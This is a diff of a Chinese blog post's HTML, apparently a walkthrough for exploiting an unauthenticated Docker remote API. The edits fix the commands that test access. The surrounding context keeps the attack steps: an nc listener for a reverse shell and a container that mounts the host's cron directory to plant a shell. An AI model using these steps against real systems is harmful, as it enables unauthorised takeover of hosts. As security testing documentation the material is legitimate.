@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    684 字
+                    679 字
                   </span>
                 
 
@@ -183,7 +183,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年5月24日 晚上
+                  本文最后更新于：2020年6月6日 凌晨
                 
               </p>
             
@@ -194,15 +194,14 @@
 172.19.101.34 2375
 # 操作系统
 linux_x86</code></pre>
-<h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker tcp:&#x2F;&#x2F;172.19.101.34:2375 --version
+<h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images
 
-# 返回版本信息，漏洞存在
-Docker version 19.03.5, build 633a0ea</code></pre>
+# 返回镜像信息，漏洞存在</code></pre>
 <h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听
 [root@]# nc -vv -l -p 8088</code></pre>
 <h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p>
 <pre><code class="hljs plain"># 查看宿主机可用镜像
-docker tcp:&#x2F;&#x2F;172.19.101.34:2375 image
+docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images
 
 # 选择合适镜像创建容器
 docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash
